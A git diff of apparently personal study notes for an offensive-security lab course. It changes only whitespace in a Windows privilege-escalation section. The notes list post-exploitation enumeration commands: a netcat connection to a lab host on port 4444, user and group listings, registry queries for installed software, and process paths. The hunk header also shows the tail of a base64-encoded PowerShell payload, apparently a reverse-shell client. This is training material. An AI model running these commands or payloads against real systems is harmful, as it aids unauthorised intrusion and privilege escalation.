@@ -3333,18 +3333,18 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     ```
 
 ### Windows Privilege Escalation  
-- 17.1.2 Situation Awareness
-  `nc 192.168.139.220 4444` `whoami` `Get-LocalUser`  `Get-LocalGroup` `Get-Content -Path .\LocalUsersGroups.csv`  
-  - Display member for group "Remote Management Users"  
-    `Get-LocalGroupMember "Remote Management Users"`
-  - List installed apps
+- 17.1.2 Situation Awareness  
+  `nc 192.168.139.220 4444` `whoami` `Get-LocalUser`  `Get-LocalGroup` `Get-Content -Path .\LocalUsersGroups.csv`   
+  - Display member for group "Remote Management Users"   
+    `Get-LocalGroupMember "Remote Management Users"`  
+  - List installed apps  
     ```
     Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 
     Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" 
     ```
-  - another member of local admin group  
+  - another member of local admin group    
     `Get-LocalGroupMember "Administrators"`
-  - List the process and file path  
+  - List the process and file path    
     `Get-Process`  `(Get-Process -Id 2552).MainModule.FileName`
 - 17.1.3 Hidden in Plain view
   - Find the flag on the desktop of backupadmin
